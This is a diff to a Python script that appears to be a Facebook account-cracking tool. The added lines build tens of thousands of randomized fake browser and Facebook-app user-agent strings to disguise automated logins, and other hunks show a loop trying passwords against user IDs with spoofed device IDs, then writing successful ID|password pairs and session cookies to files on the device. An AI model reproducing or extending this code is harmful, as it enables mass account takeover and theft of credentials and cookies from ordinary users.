@@ -175,6 +175,103 @@ for xd in range(5000):
     uaku2=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
     ugenn.append(uaku2)
 
+#new
+for agent in range(10000):
+    aa='Mozilla/5.0 (Linux; Android 6.0.1;'
+    b=random.choice(['6','7','8','9','10','11','12','13'])
+    c='en-us; 10; T-Mobile myTouch 3G Slide Build/GRI40)I148V)'
+    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
+    e=random.randrange(1, 999)
+    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
+    g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.99'
+    h=random.randrange(73,100)
+    i='0'
+    j=random.randrange(4200,4900)
+    k=random.randrange(40,150)
+    l='Mobile Safari/533.1'
+    fullagnt=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
+    ugen.append(fullagnt)
+rug=[]
+for nt in range(10000):
+    rr=random.randint
+    aZ=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
+    rx=random.randrange(1, 999)
+    xx=f"Mozilla/5.0 (Windows NT 10.0; {str(rr(9,11))}; Win64; x64){str(aZ)}{str(rx)}{str(aZ)}) AppleWebKit/537.36 (KHTML, like Gecko){str(rr(99,149))}.0.{str(rr(4500,4999))}.{str(rr(35,99))} Chrome/{str(rr(99,175))}.0.{str(rr(0,5))}.{str(rr(0,5))} Safari/537.36"
+    rug.append(xx)
+
+#new
+#new ua
+ugen99=[]
+for agent in range(10000):
+        aa='Mozilla/5.0 (Linux; Android 6.0.1;'
+        b=random.choice(['6','7','8','9','10','11','12'])
+        c='en-us; 10; T-Mobile myTouch 3G Slide Build/'
+        d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
+        e=random.randrange(1, 999)
+        f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
+        g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.99'
+        h=random.randrange(73,100)
+        i='0'
+        j=random.randrange(4200,4900)
+        k=random.randrange(40,150)
+        l='Mobile Safari/533.1'
+        fullagnt=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
+        ugen99.append(fullagnt)
+        
+      
+ugen100 = []  
+for t in range(10000):
+	aa='Mozilla/5.0 (Linux; Android 7.0; '
+	b=random.choice(['8.1.0','4','5','6','7','8','9','10','11','12'])
+	c='Hisense F102) '
+	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
+	e=random.randrange(1, 999)
+	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
+	g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.67'
+	h=random.randrange(73,100)
+	i='0'
+	j=random.randrange(4200,4900)
+	k=random.randrange(40,150)
+	l='Mobile Safari/537.36'
+	uaku=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
+	ugen100.append(uaku)
+	
+	
+uak = []
+for x in range(10000):
+    a='Mozilla/5.0 (SAMSUNG; SAMSUNG-GT-S'
+    b=random.randrange(100, 9999)
+    c=random.randrange(100, 9999)
+    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
+    e=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
+    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
+    g=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
+    h=random.randrange(1, 9)
+    i='; U; Bada/1.2; en-us) AppleWebKit/533.1 (KHTML, like Gecko) Dolfin/'
+    j=random.randrange(1, 9)
+    k=random.randrange(1, 9)
+    l='Mobile WVGA SMM-MMS/1.2.0 OPN-B'
+    uak=f'{a}{b}/{c}{d}{e}{f}{g}{h}{i}{j}.{k} {l}'
+    
+    
+uak2 = []
+for x in range(10000):
+    a='Mozilla/5.0 (Linux; Android 11.0.0; vivo V20 '
+    b=random.randrange(100, 9999)
+    c=random.randrange(100, 9999)
+    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
+    e=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
+    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
+    g=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
+    h=random.randrange(1, 9)
+    i='; 2021 Build/RP1A.200720.012) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
+    j=random.randrange(1, 9)
+    k=random.randrange(1, 9)
+    l='105.0.5195.68 Mobile Safari/537.36'
+    uak2=f'{a}{b}/{c}{d}{e}{f}{g}{h}{i}{j}.{k} {l}'
+
+
+
 gt = random.choice(['V20','V20SE','V25','V19','X50','Y31'])
 
 
@@ -189,6 +286,15 @@ def S1():
 	e = ";[FBAN/FB4A;FBAV/266.0.0.56.124;FBBV/209027763;FBDM/{density=2.625,width=1080,height=2094};FBLC/"+en+";FBRV/209644275;FBCR/"+fbcr+";FBMF/"+device04+";FBBD/"+device04+";FBPN/"+kt+";FBDV/"+device03+";FBSV/10;FBOP/1;FBCA/arm64-v8a:;]"
 	ua = s + e	
 	return ua
+
+application_version = '311.0.0.40.119'
+application_version_code = '227842969'
+density = '2.0113'
+width = '720'
+height = '1240'
+inform = 'IN6'
+ua_estring = f'[FBAN/FB4A;FBAV/{application_version};FBBV/{application_version_code};FBDM/' + f"{{density={density},width={width},height={height}}}" + f';FBLC/en_US;FBRV/{application_version_code};FBCR/Telenor;FBMF/INFINIX MOBILE LIMITED;FBBD/Infinix;FBPN/com.facebook.katana;FBDV/Infinix_{inform};FBSV/10;FBOP/19;FBCA/armeabi-v7a:armeabi;]'
+
 
 
 ok = []
@@ -504,7 +610,7 @@ class crack:
         sys.stdout.flush()
         for pw in __juts__:
             try:
-                ua = random.choice(ugen2)
+                ua = random.choice(ugenn)
                 ua2 = random.choice(ugen)
                 data={}
                 ses = requests.Session()
@@ -738,7 +844,7 @@ class crack:
                 gtt = random.choice(sm)+b+str(''.join(random.choice(string.digits) for _ in range(random.choice(uo)))+str(random.choice(string.ascii_uppercase)))
                 gttt=str(random.choice(string.ascii_uppercase))+str(random.randrange(11,99))+str(''.join(random.choice(string.ascii_uppercase) for _ in range(random.choice(uo))))
                 net=random.choice(['ZONG', 'Jazz'])
-                ua_string = f'[FBAN/FB4A;FBAV/{application_version};FBBV/{application_version_code};FBDM/'+'{density=2.5,width=1440,height=4096};FBLC/fr_FR;FBRV/472901831;FBCR/OPPO;FBMF/Motorola;FBBD/Lenovo;FBPN/com.facebook.katana;FBDV/iPhone13,1;FBSV/16;FBOP/7;FBCA/armeabi;FBSS/;]'
+                ua_string = f'[FBAN/FB4A;FBAV/{application_version};FBBV/{application_version_code};FBDM/'+'{density=2.75,width=720,height=1520};FBLC/es_ES;FBRV/0;FBCR/Banglalink;FBMF/vivo;FBBD/vivo;FBPN/com.facebook.orca;FBDV/v29e;FBSV/7;FBOP/3;FBCA/x64:arm64-v8a;]'
                 device = str(uuid.uuid4())
                 adid = str(uuid.uuid4())
                 data = {
@@ -806,7 +912,7 @@ class crack:
                         name=me['name']
                         idd=me['id']
                         print(f"\r{HH}[OK-GSXD] {used} | {pw} {VV}  ")
-                        #print(f"\#r{HH}[#OK-GSXD] {used} | {pw} | {cokie} {VV} 			   ")
+                        #print(f"\#r{HH}[OK-GSXD] {used} | {pw} | {cokie} {VV} 			   ")
                         open("/sdcard/GS-2X-IDS/M3- IDS/M3-GSXD_OK.TXT", "a").write(used + "|" + pw + "\n")
                         open("/sdcard/GS-2X-IDS/M3- IDS/M3-GSXD_COKIE.TXT", "a").write(used + "|" + pw + "|" + cokie + "	\n")
                         ok.append(used + pw)
@@ -1327,6 +1433,5 @@ class crack:
                                 __GSXDTEAM__.submit(self.__free__,uid,pwx,url1)
                         except:
                             pass
-
 
 crack().gs2x()
